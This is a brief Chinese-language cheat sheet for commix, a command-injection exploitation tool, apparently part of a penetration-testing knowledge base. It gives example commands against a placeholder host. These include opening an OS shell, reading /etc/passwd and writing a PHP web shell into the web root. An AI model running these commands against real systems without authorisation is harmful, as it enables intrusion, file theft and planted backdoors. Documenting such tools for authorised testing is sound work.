# commix

## 简介
自动化命令注入和利用工具

## 核心参数
- `-u`: 指定目标 URL
- `--data`: POST 数据
- `--cookie`: 指定 Cookie

## 命令示例
```bash
# GET 参数注入测试
commix -u "http://target.com/page?id=1"

# POST 参数注入测试
commix -u "http://target.com/login" --data="username=admin&password=test"

# 使用 Cookie
commix -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# 指定注入点
commix -u "http://target.com/page?id=INJECT_HERE"

# 获取 shell
commix -u "http://target.com/page?id=1" --os-shell

# 读取文件
commix -u "http://target.com/page?id=1" --file-read=/etc/passwd

# 写入文件
commix -u "http://target.com/page?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php
```

## 使用场景
发现和利用命令注入漏洞

## 所属分类
- [初始访问 (Initial Access)](../categories/06-initial-access.md)
